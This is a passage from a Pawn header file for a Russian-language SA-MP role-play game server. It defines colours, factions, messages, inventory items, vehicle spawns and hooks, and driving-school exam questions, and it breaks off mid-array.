#define	TEAM_SFHOSPITAL					(22)
#define	TEAM_LVHOSPITAL					(23)
#define TEAM_VDV     					(24)
#define TEAM_PRAVO   					(25)
//-----------------------------[ Цветовые коды ]--------------------------------
#define COLOR_SEA 						(0x00808000)
#define COLOR_GRAD1 					(0xB4B5B700)
#define COLOR_GRAD2 					(0xBFC0C200)
#define COLOR_GRAD3 					(0xCBCCCE00)
#define COLOR_GRAD4 					(0xD8D8D800)
#define COLOR_GRAD5 					(0xE3E3E300)
#define COLOR_GRAD6 					(0xF0F0F0FF)
#define COLOR_GREY 						(0xAFAFAFAA)
#define COLOR_GREEN 					(0x63BD4EFF)
#define COLOR_MANDARIN                 	(0xFFCC00FF)
#define COLOR_RED 						(0xFF4530FF)
#define COLOR_LIGHTRED 					(0xFF6347AA)
#define COLOR_LIGHTRED2 				(0xFF0000FF)
#define COLOR_LIGHTBLUE 				(0x0099FFAA)
#define COLOR_LIGHTGREEN 				(0x9ACD32AA)
#define COLOR_ORANGE                    (0xFF9900FF)
#define COLOR_DARKORANGE                (0xFF6600FF)
#define COLOR_YELLOW 					(0xFFFF00FF)
#define COLOR_YELLOW2 					(0xF5DEB3AA)
#define COLOR_WHITE 					(0xFFFFFFAA)
#define COLOR_FADE1 					(0xE6E6E6E6)
#define COLOR_FADE2 					(0xC8C8C8C8)
#define COLOR_TOMATO 					(0xFF6347AA)
#define COLOR_FADE3 					(0xAAAAAAAA)
#define COLOR_FADE4 					(0x8C8C8C8C)
#define COLOR_BLUE 						(0x1D99D4FF)
#define COLOR_FADE5 					(0x6E6E6E6E)
#define COLOR_PURPLE 					(0xDD90FFAA)
#define COLOR_LIME						(0x66CC00AA)
#define COLOR_DBLUE 					(0x2641FEAA)
#define COLOR_ALLDEPT 					(0xFF8282AA)
#define COLOR_NEWS 						(0xFFA500AA)
#define COLOR_OOC 						(0xE0FFFFAA)
#define COLOR_ORANG 					(0xF3BB33FF)
#define TEAM_BLUE_COLOR 				(0x8D8DFF00)
#define COLOR_BLACK 					(0x000000AA)
#define COLOR_BOX   					(0x00000050)
#define COLOR_BBLUE 					(0x20A9FFAA)
#define COLOR_BORDER 					(0x00000AA)
#define COLOR_INDIGO 					(0x4B00B0AA)
#define COLOR_GRENNN  					(0x3C67BCAA)
#define COLOR_SYSTEM 					(0xEFEFF7AA)
#define COLOR_REDD 						(0xFF0000AA)
#define COLOR_PPS 						(0x0000FFAA)

#define C_RED 0xFF6600FF
#define C_CROM 0x37c268FF
#define C_WHITE 0xFFFFFFFF
#define C_LIME 0x99CC00FF
#define C_GREY 0xAFAFAFAA
#define C_OSNOV 0xFFCC00FF
#define C_BLUE 0x0099FFAA
#define C_YELLOW 0xFFFF00FF
#define CR_GREEN 0x136711FF
#define CR_PURPLE 0xDD90FFAA
//--------------------------[ Цветовые коды фракций ]---------------------------
#define NONE_COLOR                      (0xFFFFFF11)
#define MAYOR_COLOR                     (0xCCFF00AA)
#define LSPD_COLOR                      (0x0000FFAA)
#define SFPD_COLOR                      (0x0000FFAA)
#define LVPD_COLOR                      (0x009999AA)
#define ARMY_COLOR                      (0x996633AA)
#define FBI_COLOR                       (0x161a1fAA)
#define HOSPITAL_COLOR                  (0xFF6666AA)
#define LIC_COLOR                       (0xCCFFFFAA)
#define LSNEWS_COLOR                    (0xFF6600AA)
#define SFNEWS_COLOR                    (0xFF6600AA)
#define LVNEWS_COLOR                    (0xFF6600AA)
#define YAKUZA_COLOR                    (0xBB0000AA)
#define RM_COLOR                        (0x007575AA)
#define LCN_COLOR                       (0x993366AA)
#define GROVE_COLOR 					(0x009900AA)
#define VAGOS_COLOR 					(0xFFCC00AA)
#define BALLAS_COLOR 					(0xCC00FFAA)
#define AZTECAS_COLOR 					(0x00B4E1AA)
#define RIFA_COLOR 						(0x6666FFAA)
//------------------------------------------------------------------------------
#define EMAIL_ACTIVE 					"jsrp.ru/email_active.php"
#define EMAIL_AUTHKEY 					"229933"
//------------------------------------------------------------------------------
#define GetName(%0) PI[%0][pName]
#define GetCarName(%0) PI[%0][pName]
#define RandomEx(%1,%2) (random(%2-%1)+%1)

stock FreezePlayer(playerid, time, in_car = false)
{
	TogglePlayerControllable(playerid, false);
	SetTimerEx("PlayerToggle", time, false, "dd", playerid, in_car);

	return 1;
}

//------------------------------[ ID Сообщений ]--------------------------------
enum E_MSG_CMD_NAME
{
	MSG_YOU_NOT_LOGGED_AS_ADMIN,
	MSG_YOU_ALREADY_LOGGED_AS_ADMIN,
	MSG_YOU_CAN_NOT,
	MSG_PLAYER_OFFLINE,
	MSG_PLAYER_NOT_LOGGED,
	MSG_PLAYER_HAVE_MUTE,
	MSG_PLAYER_NEED_TO_LOGGED,
	MSG_LOGGED_TIME_OVER,
	MSG_PLAYER_ACCESS,
	MSG_ADD_BLOCK,
	MSG_DEL_BLOCK,
	MSG_BLOCK_INVITE,
	MSG_BAC_TEXT_DRAW,
	MSG_PAY_HOUSE_DAYS,
	MSG_PAY_BIZZ_DAYS,
	MSG_NOT_MONEY,
	MSG_NO_PLAYER_CREATE_CAR,
	MSG_NO_MONEY_BANK,
	MSG_NO_PLAYER_CONSIST_FAMILY,
}
enum E_MSG_CMD_STRUCT
{
    E_MSG_CMD_NAME:msgID,
	msgColor,
	msgText[144]
}
new const MSG_CMD_STRUCT[][E_MSG_CMD_STRUCT] =
{
	{MSG_YOU_NOT_LOGGED_AS_ADMIN, COLOR_GREY, "Вы не авторизованы. Используйте {FFCC00}/alogin"},
	{MSG_YOU_NOT_LOGGED_AS_ADMIN, 0xFFFFFFFF, !"Команда не обнаружена! Используйте {FFCC00}/menu {FFFFFF}для просмотра команд"},
	{MSG_YOU_ALREADY_LOGGED_AS_ADMIN, COLOR_GREY, !"Вы уже авторизовались как администратор!"},
	{MSG_YOU_CAN_NOT, COLOR_GREY, !"Вам недоступна данная возможность"},
	{MSG_PLAYER_OFFLINE, COLOR_GREY, !"Игрок не в игре"},
	{MSG_PLAYER_NOT_LOGGED, COLOR_GREY, !"Игрок не ввел пароль!"},
	{MSG_PLAYER_HAVE_MUTE, COLOR_GREY, !"У Вас бан чата. (/time)"},
	{MSG_PLAYER_NEED_TO_LOGGED, COLOR_RED, !"Сервер закрыл соединение! Для выхода из игры введите: {ffffff}/q(uit)"},
	{MSG_LOGGED_TIME_OVER, COLOR_GREY, !"К сожалению, время на авторизацию истекло! Для выхода из игры введите: {ffffff}/q(uit)"},
	{MSG_PLAYER_ACCESS, 0xFFFFFFFF, "Нажмите {00CC00}Y {FFFFFF}для согласия или {FF6600}N {FFFFFF}для отказа"},
	{MSG_ADD_BLOCK, COLOR_GREY, !"Игрок уже в черном списке!"},
	{MSG_DEL_BLOCK, COLOR_GREY, !"Игрок находится в черном списке организации!"},
	{MSG_BLOCK_INVITE, COLOR_GREY, !"Игрок находится в черном списке организации!"},
	{MSG_BAC_TEXT_DRAW, COLOR_GREY, !"Закройте старый TextDraw, для того чтобы открыть новый!"},
	{MSG_PAY_HOUSE_DAYS, C_RED, !"Вы не можете оплатить проживание более чем на 10 дней"},
	{MSG_PAY_BIZZ_DAYS, C_RED, !"Вы не можете оплатить бизнес более чем на 30 дней"},
	{MSG_NOT_MONEY, C_RED, !"У Вас недостаточно денег"},
	{MSG_NO_MONEY_BANK, C_RED, !"На Вашем банковском счету недостаточно денег"},
	{MSG_NO_PLAYER_CONSIST_FAMILY, C_RED, !"Вы не состоите в семье"}
};
//------------------------------------------------------------------------------
#if !defined FALSE
	new stock
	bool:FALSE = false;
#endif
//------------------------------------------------------------------------------
#if !defined gpci
native gpci(playerid, buffer[], size = sizeof(buffer));
#endif
//------------------------------------------------------------------------------
#if !defined GetPlayerClientID
	native GetPlayerClientID(playerid, buffer[], size = sizeof(buffer)) = gpci;
#endif

// - Шкафы в домах
new Float:housecupboard[][4] = {
    {0.0,0.0,0.0},
	{438.6623,1322.2294,1615.5300},
	{-376.1974,1029.0566,1712.9200},
	{2162.9612,2824.0986,1716.2400}

};

//------------------------------------------------------------------------------
//------------------------------------------------------------------------------
//------------------------------------------------------------------------------
new Blink[MAX_VEHICLES][4];
//------------------------------------------------------------------------------
enum VehControl
{
	vLeftBlink,
	vRightBlink,
	vAvary
}
new VehInfos[MAX_VEHICLES][VehControl];
//------------------------------------------------------------------------------
new dbHandle;
//------------------------------------------------------------------------------
new Shot[MAX_PLAYERS][8];
//------------------------------------------------------------------------------
new rodEnable[MAX_PLAYERS char];
new rodRaised[MAX_PLAYERS char];

//------------------------------------------------------------------------------
enum iInv
{
	iName[32],
	iGG,
	iDrop,
	iStek,
	iLom,
}
new Item[MAX_ITEM][iInv];
new m_item;
new PlayerItem1[MAX_PLAYERS][MAX_SLOT];
new PlayerItem2[MAX_PLAYERS][MAX_SLOT];
new PlayerItem3[MAX_PLAYERS][MAX_SLOT][16];
new PlayerVesItem[MAX_PLAYERS];
new PlayerUseList[MAX_PLAYERS][MAX_LIST+1];
new GivePlayer[MAX_PLAYERS][5];

enum InventoryEntry
{
	ItemIconIndex,
	ItemCount
}
new PlayerInventory[MAX_PLAYERS][75][InventoryEntry];

enum
{
	IA_SWAP_ITEMS = 0,
	IA_USE_ITEM,
};

enum
{
	SA_USE = 0,
	SA_INFO,
	SA_DROP,
	SA_TRANSFER,
};

enum
{
	PROMO = 0,
	SATIETY
};

enum
{
	ALL = 0,
	CHAT,
	HUD,
	LOGO,
};
enum
{
	DOORS = 0,
	ENGINE,
	LIGHTS,
	SELTBELT,
	TRUNK,
	UNK,
	Float:MILEAGE,
	GAS,
};

stock AddItem(id,name[],ves,drop,stek,lom)
{
	m_item=id;
	format(Item[m_item][iName],32,"%s",name);
	Item[m_item][iGG]=ves;
	Item[m_item][iDrop]=drop;
	Item[m_item][iStek]=stek;
	Item[m_item][iLom]=lom;
	return true;
}
stock LoadMySQLSettings()
{
	new FileID = ini_openFile("mysql_settings.ini"),errCode;
	if(FileID < 0)
	{
		printf("Error while opening MySQL settings file. Error code: %d",FileID);
		return 0;
	}
	errCode = ini_getString(FileID,"host",MySQLSettings[DOOME_HOST]);
	if(errCode < 0) printf("Error while reading MySQL settings file (host). Error code: %d",errCode);
	errCode = ini_getString(FileID,"username",MySQLSettings[DOOME_USERNAME]);
	if(errCode < 0) printf("Error while reading MySQL settings file (username). Error code: %d",errCode);
	errCode = ini_getString(FileID,"password",MySQLSettings[DOOME_PASSWORD]);
	if(errCode < 0) printf("Error while reading MySQL settings file (password). Error code: %d",errCode);
	errCode = ini_getString(FileID,"database",MySQLSettings[DOOME_DATABASE]);
	if(errCode < 0) printf("Error while reading MySQL settings file (database). Error code: %d",errCode);
	ini_closeFile(FileID);
	return 1;
}
stock LoadAddItem()
{
	AddItem(1,"Кастет",108,1,0,100);
	AddItem(2,"Клюшка для гольфа",350,1,0,100);
	AddItem(3,"Дубинка",350,1,0,100);
	AddItem(4,"Нож",150,1,0,100);
	AddItem(5,"Бита",550,1,0,100);
	AddItem(6,"Лопата",1800,1,0,100);
	AddItem(7,"Кий",650,1,0,100);
	AddItem(8,"Катана",82,1,0,100);
	AddItem(9,"Бензопила",3500,1,0,100);
	AddItem(10,"Самотык 1",260,1,0,100);
	AddItem(11,"Самотык 2",260,1,0,100);
	AddItem(12,"Самотык 3",260,1,0,100);
	AddItem(13,"Самотык 4",260,1,0,100);
	AddItem(14,"Цветы",240,1,0,100);
	AddItem(15,"Трость",400,1,0,100);
	AddItem(16,"Граната",500,1,1,100);
	AddItem(17,"Газ граната",500,1,1,100);
	AddItem(18,"Молотов",600,1,1,100);
	AddItem(19,"Colt М1911",960,1,0,100);
	AddItem(20,"Colt М1911 с глушителем",1200,1,0,100);
	AddItem(21,"Desert Eagle",1100,1,0,100);
	AddItem(22,"Remington 870",3200,1,0,100);
	AddItem(23,"Обрез",2100,1,0,100);
	AddItem(24,"Franchi SPAS 12",4000,1,0,100);
	AddItem(25,"Ингрэм мак",2800,1,0,100);
	AddItem(26,"HK MP5",2540,1,0,100);
	AddItem(27,"АК 47",4300,1,0,100);
	AddItem(28,"Colt M4",2520,1,0,100);
	AddItem(29,"Тес 9",2300,1,0,100);
	AddItem(30,"Иж 72",3150,1,0,100);
	AddItem(31,"US army m24",5490,1,0,100);
	AddItem(32,"РПГ",2900,1,0,100);
	AddItem(33,"Ракетная установка",3400,1,0,100);
	AddItem(34,"Огнемет",2500,1,0,100);
	AddItem(35,"M134 Minigun",4000,1,0,100);
	AddItem(36,"Спрей",250,1,1,100);
	AddItem(37,"Огнетушитель",6500,1,0,100);
	AddItem(38,"Фото-камера",10,1,1,100);
	AddItem(39,"Парашют",1900,1,0,100);
	AddItem(40,"Плеер MP3",50,1,1,100);
	AddItem(41,"Наручные часы",120,1,0,100);
	AddItem(42,"Патроны",6,1,1,100);
	AddItem(43,"Жезл",300,1,0,100);
	AddItem(44,"Наркотики",40,1,1,100);
	AddItem(45,"Маска",150,1,0,100);
	AddItem(46,"Сигареты",10,1,1,100);
	AddItem(47,"Телефон",350,1,0,100);
	AddItem(48,"Набор инструментов",2980,1,0,100);
	AddItem(49,"Канистра 10 л.",3200,1,0,100);
	//Еда
	AddItem(50,"Маленькая пицца",110,1,1,100);
	AddItem(51,"Бургер",112,1,1,100);
	AddItem(52,"Кусочки курицы",111,1,1,100);
	AddItem(53,"---",132,1,1,100);
	AddItem(54,"---",379,1,1,100);
	AddItem(55,"Средняя пицца",120,1,1,100);
	AddItem(56,"Большой бургер",122,1,1,100);
	AddItem(57,"Куринные ножки",121,1,1,100);
	AddItem(58,"---",420,1,1,100);
	AddItem(59,"---",100,1,1,100);
	AddItem(60,"Большая пицца",140,1,0,100);
	AddItem(61,"Гамбургер",142,1,0,100);
	AddItem(62,"Куринная ножка",141,1,0,100);
	AddItem(63,"---",450,1,0,100);
	AddItem(64,"---",450,1,0,100);
	AddItem(65,"Пицца в коробке",160,1,0,100);
	AddItem(66,"Гамбургер в упаковке",162,1,0,100);
	AddItem(67,"Курицу в коробке",161,1,0,100);
	AddItem(68,"---",480,1,0,100);
	AddItem(69,"---",60,1,1,100);
	AddItem(70,"Спранк",150,1,1,100);
	AddItem(71,"---",345,1,0,100);
	AddItem(72,"---",50,1,1,100);
	AddItem(73,"---",380,1,0,100);
	AddItem(74,"---",380,1,0,100);
	AddItem(75,"---",380,1,0,100);
	AddItem(76,"---",280,1,0,100);
	AddItem(77,"---",58,1,0,100);
	AddItem(78,"---",48,1,0,100);
	AddItem(79,"---",38,1,0,100);
	AddItem(80,"Чай без сахара",130,1,0,100);
	AddItem(81,"Чай с сахаром",131,1,0,100);
	AddItem(82,"Кофе",250,1,0,100);
	AddItem(83,"---",250,1,0,100);
	AddItem(84,"---",250,1,0,100);
	AddItem(85,"---",53,1,0,100);
	AddItem(86,"---",53,1,0,100);
	AddItem(87,"Молоко",460,1,0,100);
	AddItem(88,"Кефир",420,1,0,100);
	AddItem(89,"Сметана",120,1,0,100);
	AddItem(90,"Йогурт",200,1,0,100);
	AddItem(91,"---",180,1,0,100);
	AddItem(92,"---",850,1,0,100);
	AddItem(93,"---",450,1,0,100);
	AddItem(94,"---",450,1,0,100);
	AddItem(95,"---",25,1,1,100);
	AddItem(96,"---",450,1,1,100);
	AddItem(97,"---",450,1,1,100);
	AddItem(98,"---",450,1,1,100);
	AddItem(99,"---",15,1,1,100);
	AddItem(100,"Вода в бутылке",500,1,1,100);
	AddItem(101,"Спрайт",500,1,1,100);
	AddItem(102,"Кока-кола",500,1,1,100);
	AddItem(103,"Квас",850,1,1,100);
}

enum dItem
{
	dNumber,
	dIDItem,
	dPiece,
	dValue[32],
	Float:dX,
	Float:dY,
	Float:dZ,
	dInt,
	dWorld,
	dObject,
	Text3D:dText,
	dTime,
}
new DropItem[MAX_DROP][dItem];

//Переменные
new Dvers[17];// двери ворота мосты
new SDvers[16];//Статус двери ворота мосты
new Pickup[28];
// сис-ма мп
new Teleport;
new Float:TeleportFloat[3];
new TeleportInfo[2];
//Лицо
new kamera[MAX_PLAYERS];
new lizo[MAX_PLAYERS];
new Phonesmenu[MAX_PLAYERS];
new PlayersMenu[MAX_PLAYERS];//1-mn|2-tuning|3-азс|4-пикбиза|5-пикдома|6-atm|7-bank
//8-сто|
new Conday[3];
new Float:SalonRandSpawn[][4] = {
	{348.9806,1625.6530,12.1238,264.0701},
	{348.1755,1621.1398,12.1229,265.6372},
	{347.3381,1617.0513,12.1246,264.2939},
	{346.9796,1612.8553,12.1244,264.6965},
	{346.6563,1608.7148,12.1242,264.7406},
	{345.6935,1600.1962,12.1266,265.9012},
	{345.3516,1596.1418,12.1257,265.2001},
	{345.0779,1591.9164,12.1253,264.1651},
	{344.8413,1587.5780,12.1253,264.0021},
	{344.4937,1583.5736,12.1247,264.2620},
	{344.0602,1579.2240,12.1239,265.4453},
	{343.8798,1575.1587,12.1227,265.4886},
	{343.3752,1570.9507,12.1255,264.2601}
};
new Float:SalonRandSpawn_1[][4] = {
	{-30.6202,474.6277,10.6750,171.9145},
	{-14.4517,505.0273,10.6823,260.6480},
	{-15.4583,497.6478,10.6819,260.7876},
	{-17.4689,490.3580,10.6747,260.2677}
};
new Float:SalonRandSpawn_2[][4] = {
	{2303.6477,-1843.8328,22.1361,269.8685},
	{2303.3542,-1839.6111,22.1360,269.3860},
	{2303.6646,-1814.6483,22.1360,268.6239},
	{2303.5396,-1789.1033,22.1364,268.2176}
};
new Float:SalonRandSpawn_3[][4] = {
	{2024.1851,2741.7883,11.9050,182.0266},
	{2027.2379,2718.0828,11.9351,89.5411},
	{2027.2527,2725.7383,11.9346,92.2297},
	{2002.4093,2725.4993,11.9446,94.3167}
};

new bool:Baton[MAX_PLAYERS] = false;

static const stock prohibited_weapons[8] = {35, 36, 37, 38, 44, 45, 39, 40};
static const stock player_weapons[16] = {16, 17, 18, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34};

/*enum arendInfo
{
	aID,            // - Unknown -
	aPlayerID,      // - Unknown -
	aModel,			// Model
	aCost,			// Цена
	Float:aPos_X,	// Кордината X
	Float:aPos_Y,	// Кордината Y
	Float:aPos_Z,	// Кордината Z
	Float:aPos_A,	// Угол поворота
	aColor_1,		// Цвет 1
	aColor_2		// Цвет 2
};

new ArendInfo[][arendInfo] =
{//ID, Цена, Координаты X, Y, Z, Цвет 1, Цвет 2
	{INVALID_VEHICLE_ID, INVALID_PLAYER_ID, 400, 10000, 1767.4752,2276.2292,15.9851,119.4527,1,1},
	{INVALID_VEHICLE_ID, INVALID_PLAYER_ID, 405, 11000, 1767.3779,2280.3293,15.8587,117.6084,1,1},
	{INVALID_VEHICLE_ID, INVALID_PLAYER_ID, 410, 12000, 1767.3435,2283.9751,15.7439,116.4978,1,1},
	{INVALID_VEHICLE_ID, INVALID_PLAYER_ID, 404, 13000, 1767.1190,2287.4026,15.8982,118.3782,1,1},
	{INVALID_VEHICLE_ID, INVALID_PLAYER_ID, 496, 14000, 1766.9801,2290.6292,15.7428,124.6011,1,1},
	{INVALID_VEHICLE_ID, INVALID_PLAYER_ID, 436, 15000, 1767.0884,2294.7212,15.8015,132.2574,1,1},
	{INVALID_VEHICLE_ID, INVALID_PLAYER_ID, 492, 10000, 1767.1710,2298.7424,15.9770,118.6001,1,1},
	{INVALID_VEHICLE_ID, INVALID_PLAYER_ID, 551, 11000, 1766.9067,2302.8591,15.4082,123.3867,1,1},
	{INVALID_VEHICLE_ID, INVALID_PLAYER_ID, 477, 12000, 1756.9082,2275.3210,15.7153,307.6452,1,1},
	{INVALID_VEHICLE_ID, INVALID_PLAYER_ID, 602, 13000, 1756.6948,2280.6196,15.7877,313.6165,1,0},
	{INVALID_VEHICLE_ID, INVALID_PLAYER_ID, 585, 14000, 1756.8026,2285.9688,15.5668,313.6661,1,1},
	{INVALID_VEHICLE_ID, INVALID_PLAYER_ID, 550, 15000, 1756.6821,2291.6360,15.8238,310.1870,1,1},
	{INVALID_VEHICLE_ID, INVALID_PLAYER_ID, 560, 10000, 1756.3522,2297.1458,15.6445,312.9106,1,1},
	{INVALID_VEHICLE_ID, INVALID_PLAYER_ID, 579, 11000, 1756.8947,2301.7400,15.9449,308.8345,1,1},
	{INVALID_VEHICLE_ID, INVALID_PLAYER_ID, 411, 11000, 1757.2424,2306.8218,15.8285,299.4370,1,1},//посл.машина автобаза
	{INVALID_VEHICLE_ID, INVALID_PLAYER_ID, 469, 20000, 1715.5894,1736.4967,15.2993,180.1004,1,1},
	{INVALID_VEHICLE_ID, INVALID_PLAYER_ID, 487, 19000, 1761.5638,1740.2681,15.5192,180.1004,1,1},
	{INVALID_VEHICLE_ID, INVALID_PLAYER_ID, 512, 19500, 1745.9329,1761.4584,15.6068,164.1289,1,1},
	{INVALID_VEHICLE_ID, INVALID_PLAYER_ID, 513, 19500, 1725.7324,1756.4557,15.8791,215.6779,1,1},
	{INVALID_VEHICLE_ID, INVALID_PLAYER_ID, 593, 35500, 1676.0579,1736.7913,16.6114,180.3325,1,1},//посл.самолет мирный
	{INVALID_VEHICLE_ID, INVALID_PLAYER_ID, 446, 35500, 2837.7368,-1520.1698,-0.4801,270.8655,1,1},
	{INVALID_VEHICLE_ID, INVALID_PLAYER_ID, 453, 35500, 2836.2080,-1553.5626,-0.3515,270.8655,1,1},
	{INVALID_VEHICLE_ID, INVALID_PLAYER_ID, 454, 45500, 2855.1223,-1528.8856,0.1892,270.8655,1,1},
	{INVALID_VEHICLE_ID, INVALID_PLAYER_ID, 473, 35500, 2843.6614,-1534.3116,-0.2298,270.8655,1,1},
	{INVALID_VEHICLE_ID, INVALID_PLAYER_ID, 493, 35500, 2845.5417,-1538.6682,-0.0976,270.8655,1,1},
	{INVALID_VEHICLE_ID, INVALID_PLAYER_ID, 454, 45500, 2855.1223,-1545.0531,0.0797,270.8655,1,1},//Конец лодок
	{INVALID_VEHICLE_ID, INVALID_PLAYER_ID, 462, 50, 168.3427,801.6275,11.5650,340.0409,0,1},//1 скутер спавн
	{INVALID_VEHICLE_ID, INVALID_PLAYER_ID, 462, 50, 166.9195,802.1925,11.5646,342.8921,1,1},
	{INVALID_VEHICLE_ID, INVALID_PLAYER_ID, 462, 50, 165.4075,802.7139,11.5651,342.2088,2,1},
	{INVALID_VEHICLE_ID, INVALID_PLAYER_ID, 462, 50, 163.8657,803.3596,11.5654,344.4158,3,1},
	{INVALID_VEHICLE_ID, INVALID_PLAYER_ID, 462, 50, 162.3462,803.9603,11.5653,342.3939,4,1},
	{INVALID_VEHICLE_ID, INVALID_PLAYER_ID, 462, 50, 160.7957,804.4875,11.5651,341.9006,6,1},
	{INVALID_VEHICLE_ID, INVALID_PLAYER_ID, 462, 50, 159.3052,805.1667,11.5654,342.7124,0,1},
	{INVALID_VEHICLE_ID, INVALID_PLAYER_ID, 462, 50, 157.8300,805.6387,11.5656,342.9879,1,1},
	{INVALID_VEHICLE_ID, INVALID_PLAYER_ID, 462, 50, 156.2254,806.2215,11.5652,341.6134,2,1},
	{INVALID_VEHICLE_ID, INVALID_PLAYER_ID, 462, 50, 154.8357,806.7422,11.5651,340.5568,3,1},
	{INVALID_VEHICLE_ID, INVALID_PLAYER_ID, 462, 50, 153.3859,807.2234,11.5651,341.4451,4,1},
	{INVALID_VEHICLE_ID, INVALID_PLAYER_ID, 462, 50, 151.7678,807.8463,11.5655,343.5265,6,1} // последний скутер на спавне
};*/

enum r_info
{
	r_id,
	r_name[24],
	r_type,
	r_speed,
	Float:r_x,
	Float:r_y,
	Float:r_z,
	Float:r_a,
	r_object,
	Text3D:r_label,
	r_area,
}
new RI[MAX_RADARS][r_info];
new TOTALRADAR;


new
	secupdate
;

new doubling_exp;
new doubling_donate;
new doubling_donate_x3;
new doubling_job;

enum chInfo
{
	chID1
}

enum smInfo
{
	smInput[5],
	smOutput_M[40],
	smOutput_F[40]
}

static const stock SmileInfo[SMILE_COUNT][smInfo] = {
	{")", "улыбается", "улыбается"},
	{"))", "смеётся", "смеётся"},
	{"(", "расстроился", "расстроилась"},
	{"((", "сильно расстроился", "сильно расстроилась"},
	{"=0", "удивился", "удивилась"}
};

new PassRegSex[MAX_PLAYERS];
enum psInfo
{
	psSeria,
	psNumber,
	psSex,
	psDate[3],
	psDateBirth[3],
	psCity,
	mcState
}
new PassInfo[MAX_PLAYERS][psInfo];

enum VGUN_DATA
{
	vGunArea,
	vGunGunAmount,
	vGunAmmo,
	Text3D:vGunText,
	bool:vGunLoading,
	bool:vGunUnloading,
	vGunPickup
}
new gVehicleGun[MAX_VEHICLES][VGUN_DATA];

new Iterator:VehicleGun<MAX_VEHICLES-1>;

new
	admin_attempt[MAX_PLAYERS],
	admin_ban_time[MAX_PLAYERS],
	admin_check_time[MAX_PLAYERS]
;

new Iterator:Vehicle<MAX_VEHICLES>;

stock foreach_wr_CreateVehicle(modelid, Float:x, Float:y, Float:z, Float:angle, color1, color2, respawn_delay)
{
    new veh = CreateVehicle(modelid, x, y, z, angle, color1, color2, respawn_delay);
    Itter_Add(Vehicle, veh);
    return veh;
}
#if    defined    _ALS_CreateVehicle
    #undef    CreateVehicle
#else
    #define    _ALS_CreateVehicle
#endif
#define    CreateVehicle(%0)    foreach_wr_CreateVehicle(%0)

stock foreach_wr_AddStaticVehicleEx(modelid, Float:x, Float:y, Float:z, Float:angle, color1, color2, respawn_delay)
{
    new veh = AddStaticVehicleEx(modelid, x, y, z, angle, color1, color2, respawn_delay);
    Itter_Add(Vehicle, veh);
    return veh;
}
#if    defined    _ALS_AddStaticVehicleEx
    #undef    AddStaticVehicleEx
#else
    #define    _ALS_AddStaticVehicleEx
#endif
#define    AddStaticVehicleEx(%0)    foreach_wr_AddStaticVehicleEx(%0)

stock foreach_wr_AddStaticVehicle(modelid, Float:x, Float:y, Float:z, Float:angle, color1, color2)
{
    new veh = AddStaticVehicle(modelid, x, y, z, angle, color1, color2);
    Itter_Add(Vehicle, veh);
    return veh;
}
#if    defined    _ALS_AddStaticVehicle
    #undef    AddStaticVehicle
#else
    #define    _ALS_AddStaticVehicle
#endif
#define    AddStaticVehicle(%0)    foreach_wr_AddStaticVehicle(%0)

stock foreach_wr_DestroyVehicle(veh)
{
    Itter_Remove(Vehicle, veh);
	DestroyDynamic3DTextLabel(g_vehicle[veh][veh_number_label]);
    return DestroyVehicle(veh);
}
#if    defined    _ALS_DestroyVehicle
    #undef    DestroyVehicle
#else
    #define    _ALS_DestroyVehicle
#endif
#define    DestroyVehicle(%0)    foreach_wr_DestroyVehicle(%0)

// iterators
new Iterator:Admins<MAX_PLAYERS>;
new Iterator:EventPlayers<MAX_PLAYERS>;

new radar_time[MAX_PLAYERS];

new gGunWorkWH[3]; //Склад оружейного цеха. 0-уголь, 1-дерево, 2-оружие //ЕГОР ШУТОВ
new Text3D:gGunWorkWHText[3];
new Text3D:gGunWorkMinerText[3];
new Text3D:LessdrovText[1];

new Lessdrov; //дрова на лесопилке
new Mineral; //угля на шахте

//Автошкола

new gExamTrueAnswer[25]={1,3,4,2,4,3,2,3,1,2,2,1,2,4,3,2,1,3,1,4,2,1,3,1,4};
new gExamQuestions[25][90] = {
	"В каком случае разрешен обгон впереди движущегося т/с?",
	"Разрешен ли обгон впереди движущегося т/с по городу?",
	"Какова макс скорость транспортного средства по автомагистрали?",
	"Какова макс скорость транспортного средства по пригороду?",
	"При виде т/с с включенным спец.сигналом, водитель обязан?",
	"В каких случаях разрешен обгон с права?",
	"Какова макс. скорость транспортного средства по городу?",
	"Какого типа установлены перекрестки в области?",
	"Что такое ДТП?",
	"Что следует делать при возникновении ДТП в первую очередь?",
	"В каком месте водитель имеет право осуществлять парковку?",
	"Что следует делать водителю при проезде перекрестка?",
	"Со скольки лет можно получить водительские права?",
	"В каком случае следует пристегивать ремень безопастности?",
	"Когда можно включать дальний свет фар?",
	"Разрешен ли обгон по двойной сплошной линии?",
	"Можно ли устанавливать спец. Сигнал на личный автомобиль?",
	"Разрешен ли обгон по прерывистой линии?",
	"Стоит ли соблюдать грузоподъемность тягача?",
	"В каком случае можно включать аварийный сигнал?",
	"Обязательна ли остановка перед пешеходным переходом?",
	"Разрешен ли разворот т/c в туннеле?",
	"Необходимо ли смотреть в зеркала заднего вида при маневре задним ходом?",
	"Разрешено ли движение задним ходом на магистрале?",
	"Должны ли быть видны гос.номера автомобиля? "
};
new gExamAnswers[25][4][75] = {
	{"В случае отсутствия очевидной угрозы лобового столкновения.","В случае передвижения за городом.","В случае передвижения по городу.","В случае очевидной угрозы лобового столкновения"}, //1
	{"Разрешен всегда","Запрещен обгон с лева","Разрешен в случае отсутствия угрозы столкновения","Запрещен всегда"}, //2
	{"60 Км/ч","10 Км/ч","130 Км/ч","150 Км/ч"}, //3
	{"100 Км/ч","110 Км/ч","60 Км/ч","90 Км/ч"}, //4
	{"Продолжить движение в прежнем темпе.","Резко остановить транспортное средство.","Снизить скорость транспортного средства до 40 Км/ч","Постепенно снизить скорость и прижаться к обочине."}, //5
	{"Разрешен всегда","Запрещен","Разрешен в случае поворота впереди движущегося транспортного средства.","Разрешен за городом"}, //6
	{"50 Км/ч","60 Км/ч","70 Км/ч","80 Км/ч"}, //7
	{"Регулируемые равнозначных дорог","Регулируемые неравнозначных дорог","Нерегулируемые равнозначных дорог","Нерегулируемые неравнозначных дорог"}, //8
	{"Дорожно-транспортное происшествие.","Дорожно-транспортное предприятие.","Дорожно-торговое предприятие.","Дорожно-торговое предприятствие."}, //9
	{"Скрыться с места ДТП.","Оставаться на месте ДТП и Вызвать сотрудников ПО.","Оставаться на месте ДТП и Вызвать службу спасения.","Вызвать сотрудников скорой помощи."}, //10
	{"По среди дороги","На парковке.","На перекрестке","На тротуаре"}, //11
	{"Снизить скорость и проехать при отсутствии помех.","Увеличить скорость.","Проехать не изменяя скорость.","Остановиться перед перекрёстком."}, //12
